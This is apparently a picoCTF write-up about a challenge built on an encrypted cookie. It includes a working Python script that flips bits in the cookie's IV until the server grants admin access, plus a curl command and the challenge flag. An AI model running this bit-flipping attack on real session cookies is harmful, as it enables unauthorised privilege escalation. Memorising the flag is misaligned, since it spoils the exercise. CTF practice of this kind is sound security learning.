In this Challenge,

You have to play with the cookies as the name suggest!

**FIRST STEP**,
Go to the link and for inspecting the website, Right click on it and click on the inspect.
here, you have to go to the application tab( i.e. present on dock tab after various option like Element,console...etc).
afer that, go to the cookies option!


then Copy down the cookie given! i.e. 
```bash
b1B3OGpxb2piSzFqU1R3bkx2dHkzcHQ1MFlpNmR2VUt1VW96cUVveFh3MHFCRmdGUEc4N2l3TU5mbU50Ti80YkJtN25qMHVuUksyM1ljemxxVC9GcXBhR3h1b1dIblFmTXBReHZiSzdJejRvRGZ2akwrT1hUS2I2VGhtVk4xMkg=
```

alternatively, you can do by curl tool:
```bash
curl -I http://mercury.picoctf.net:15614/
```
According the the challenge description, this must be the encrypted cookie. The challenge said that since cookies can be modified on the client side, the mitigation was to encrypt them. However, if the encryption method is Homomorphic, changes made to the encrypted form will affect the decrypted form. This can be exploited using a Bit Flipping Attack.

So, we hope that somewhere in the cookie we have something like admin=0, and start flipping bits so that the plaintext will be transformed to admin=1.

so follow the following code and run it by ***python***(not python2 or python3):

```bash
# Adapted from python2 solution by Martin Carlisle on youtube
# With help from github copilot <3

import requests
import base64

s=requests.Session()
s.get('http://mercury.picoctf.net:10868/')
cookie = s.cookies['auth_name']
unb64 = base64.b64decode(cookie)
unb64b = base64.b64decode(unb64)
# first 128-bit block is IV, flip IV bit to flip plaintext bit "admin=0" to "admin=1"
# looping through bytes (16 bytes because 128-bit block)
for i in range(0, 128):
    pos=i//8
    guessdec = unb64b[0:pos] + (unb64b[pos]^(1<<(i%8))).to_bytes(1, 'big') + unb64b[pos+1:]
    guess=base64.b64encode(base64.b64encode(guessdec))
    r=requests.get('http://mercury.picoctf.net:10868/', cookies={"auth_name": guess.decode()})
    if "pico" in r.text:
        print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
        break
```
You'll get the flag of this Challenge,

***Flag for this challenge:***  picoCTF{cO0ki3s_yum_e57b2438}